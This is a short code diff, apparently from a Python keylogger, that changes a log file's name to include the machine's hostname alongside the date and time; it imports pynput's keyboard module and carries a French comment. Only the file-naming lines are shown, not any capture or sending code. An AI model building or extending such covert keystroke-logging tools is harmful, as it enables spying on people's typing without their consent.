@@ -2,7 +2,7 @@ import socket
 from pynput import keyboard
 import datetime
 
-namefile = datetime.datetime.now().strftime("%I %M%p on %B %d %Y") + ".txt"
+namefile = datetime.datetime.now().strftime("%I %M%p on %B %d %Y") +"_" + socket.gethostname() + ".txt"
 f = open(namefile, "w+")
 
 # crée un nouveau fichier texte intitulé date+heure.txt
